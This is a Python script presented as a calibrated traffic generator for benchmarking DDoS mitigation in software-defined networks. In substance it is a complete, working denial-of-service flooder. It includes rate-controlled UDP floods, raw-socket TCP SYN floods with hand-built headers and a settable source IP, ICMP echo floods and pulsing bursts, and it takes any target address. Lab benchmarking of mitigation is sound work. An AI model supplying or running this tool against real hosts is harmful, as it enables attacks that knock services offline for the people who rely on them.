#!/usr/bin/env python3
"""
High-Precision Calibrated Network Traffic Generator & Flooder
==============================================================
Generates steady, calibrated, high-throughput network flows (UDP, TCP SYN, ICMP, Pulsing)
for SDN DDoS mitigation benchmarking without the CPU starvation and timer jitter of usleep loops.

Usage:
    python3 traffic_flooder.py --proto udp --target 10.0.0.3 --port 80 --rate 9500
    python3 traffic_flooder.py --proto tcp_syn --target 10.0.0.3 --port 80 --rate 6800
    python3 traffic_flooder.py --proto icmp --target 10.0.0.3 --rate 5200
    python3 traffic_flooder.py --proto pulse --target 10.0.0.3 --port 53 --rate 7600 --on 10 --off 5
    python3 traffic_flooder.py --proto udp --target 10.0.0.3 --port 5001 --rate 820
"""

import os
import sys
import time
import socket
import struct
import signal
import argparse

def checksum(data: bytes) -> int:
    """Calculate internet checksum (RFC 1071)."""
    if len(data) % 2 != 0:
        data += b'\x00'
    s = sum(struct.unpack(f"!{len(data)//2}H", data))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def build_icmp_echo_packet(seq: int = 1, payload_size: int = 56) -> bytes:
    """Build a standard ICMP Echo Request packet."""
    icmp_type = 8  # Echo Request
    icmp_code = 0
    icmp_id = os.getpid() & 0xFFFF
    dummy_checksum = 0
    payload = b'A' * payload_size
    header = struct.pack("!BBHHH", icmp_type, icmp_code, dummy_checksum, icmp_id, seq & 0xFFFF)
    chk = checksum(header + payload)
    return struct.pack("!BBHHH", icmp_type, icmp_code, chk, icmp_id, seq & 0xFFFF) + payload

def build_tcp_syn_packet(src_ip: str, dst_ip: str, src_port: int, dst_port: int, seq: int = 1000) -> bytes:
    """Build a raw IPv4 + TCP SYN packet."""
    # IPv4 Header
    ip_ihl_ver = (4 << 4) | 5
    ip_tos = 0
    ip_tot_len = 40  # 20 IP + 20 TCP
    ip_id = os.getpid() & 0xFFFF
    ip_frag_off = 0
    ip_ttl = 64
    ip_proto = socket.IPPROTO_TCP
    ip_chk = 0
    s_addr = socket.inet_aton(src_ip)
    d_addr = socket.inet_aton(dst_ip)

    ip_header_dummy = struct.pack("!BBHHHBBH4s4s", ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
                                  ip_frag_off, ip_ttl, ip_proto, ip_chk, s_addr, d_addr)
    ip_chk = checksum(ip_header_dummy)
    ip_header = struct.pack("!BBHHHBBH4s4s", ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
                            ip_frag_off, ip_ttl, ip_proto, ip_chk, s_addr, d_addr)

    # TCP Header
    tcp_seq = seq
    tcp_ack_seq = 0
    tcp_doff_res = (5 << 4) | 0
    tcp_flags = 0x02  # SYN flag
    tcp_window = socket.htons(5840)
    tcp_chk = 0
    tcp_urg_ptr = 0

    tcp_header_dummy = struct.pack("!HHLLBBHHH", src_port, dst_port, tcp_seq, tcp_ack_seq,
                                   tcp_doff_res, tcp_flags, tcp_window, tcp_chk, tcp_urg_ptr)

    # Pseudo-header for TCP checksum
    pseudo_hdr = struct.pack("!4s4sBBH", s_addr, d_addr, 0, socket.IPPROTO_TCP, len(tcp_header_dummy))
    tcp_chk = checksum(pseudo_hdr + tcp_header_dummy)
    tcp_header = struct.pack("!HHLLBBH", src_port, dst_port, tcp_seq, tcp_ack_seq,
                             tcp_doff_res, tcp_flags, tcp_window) + struct.pack("H", tcp_chk) + struct.pack("!H", tcp_urg_ptr)

    return ip_header + tcp_header

def run_flooder():
    parser = argparse.ArgumentParser(description="Calibrated Traffic Flooder")
    parser.add_argument("--proto", choices=["udp", "tcp_syn", "icmp", "pulse"], default="udp")
    parser.add_argument("--target", default="10.0.0.3")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--rate", type=float, default=5000.0, help="Target packets per second")
    parser.add_argument("--on", type=float, default=10.0, help="Pulsing ON duration (seconds)")
    parser.add_argument("--off", type=float, default=5.0, help="Pulsing OFF duration (seconds)")
    parser.add_argument("--src-ip", default=None, help="Explicit source IP for raw packets")
    args = parser.parse_args()

    def shutdown(signum=None, frame=None):
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown)
    signal.signal(signal.SIGTERM, shutdown)

    target_ip = args.target
    target_port = args.port
    rate_pps = max(1.0, args.rate)
    proto = args.proto

    # Calculate optimal batching:
    # 25-50 packets per batch allows clean micro-sleeps without CPU starvation
    if rate_pps >= 5000:
        batch_size = 35
    elif rate_pps >= 1000:
        batch_size = 15
    elif rate_pps >= 200:
        batch_size = 5
    else:
        batch_size = 1

    batch_interval = batch_size / rate_pps

    # Sockets setup
    udp_payload = b'X' * 64
    dest_addr = (target_ip, target_port)

    raw_tcp_available = False
    raw_icmp_available = False

    if proto == "tcp_syn":
        try:
            s_tcp = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s_tcp.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            raw_tcp_available = True
        except PermissionError:
            # Fallback to non-blocking TCP connect attempts if non-root
            raw_tcp_available = False

    if proto == "icmp":
        try:
            s_icmp = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            raw_icmp_available = True
        except PermissionError:
            raw_icmp_available = False

    if proto in ("udp", "pulse") or not raw_tcp_available:
        s_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s_udp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Determine local IP for raw headers
    if not args.src_ip:
        try:
            temp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            temp_sock.connect((target_ip, 80))
            my_ip = temp_sock.getsockname()[0]
            temp_sock.close()
        except Exception:
            my_ip = "10.0.0.2"
    else:
        my_ip = args.src_ip

    seq_counter = 1
    src_port_base = 30000

    if proto == "pulse":
        on_sec = args.on
        off_sec = args.off
        while True:
            # PULSE ON:
            t_end = time.perf_counter() + on_sec
            while time.perf_counter() < t_end:
                t0 = time.perf_counter()
                for _ in range(batch_size):
                    s_udp.sendto(udp_payload, dest_addr)
                elapsed = time.perf_counter() - t0
                sleep_sec = batch_interval - elapsed
                if sleep_sec > 0.0005:
                    time.sleep(sleep_sec)

            # PULSE OFF:
            time.sleep(off_sec)

    elif proto == "udp":
        while True:
            t0 = time.perf_counter()
            for _ in range(batch_size):
                s_udp.sendto(udp_payload, dest_addr)
            elapsed = time.perf_counter() - t0
            sleep_sec = batch_interval - elapsed
            if sleep_sec > 0.0005:
                time.sleep(sleep_sec)

    elif proto == "tcp_syn":
        if raw_tcp_available:
            while True:
                t0 = time.perf_counter()
                for _ in range(batch_size):
                    src_port = src_port_base + (seq_counter % 30000)
                    pkt = build_tcp_syn_packet(my_ip, target_ip, src_port, target_port, seq=seq_counter)
                    s_tcp.sendto(pkt, (target_ip, 0))
                    seq_counter += 1
                elapsed = time.perf_counter() - t0
                sleep_sec = batch_interval - elapsed
                if sleep_sec > 0.0005:
                    time.sleep(sleep_sec)
        else:
            # Fallback high-rate connect
            while True:
                t0 = time.perf_counter()
                for _ in range(batch_size):
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setblocking(False)
                    try:
                        s.connect_ex((target_ip, target_port))
                    except Exception:
                        pass
                    s.close()
                elapsed = time.perf_counter() - t0
                sleep_sec = batch_interval - elapsed
                if sleep_sec > 0.0005:
                    time.sleep(sleep_sec)

    elif proto == "icmp":
        if raw_icmp_available:
            while True:
                t0 = time.perf_counter()
                for _ in range(batch_size):
                    pkt = build_icmp_echo_packet(seq_counter)
                    s_icmp.sendto(pkt, (target_ip, 1))
                    seq_counter += 1
                elapsed = time.perf_counter() - t0
                sleep_sec = batch_interval - elapsed
                if sleep_sec > 0.0005:
                    time.sleep(sleep_sec)
        else:
            # UDP probe fallback
            while True:
                t0 = time.perf_counter()
                for _ in range(batch_size):
                    s_udp.sendto(b'ICMP_SIM', (target_ip, 0))
                elapsed = time.perf_counter() - t0
                sleep_sec = batch_interval - elapsed
                if sleep_sec > 0.0005:
                    time.sleep(sleep_sec)

if __name__ == '__main__':
    run_flooder()
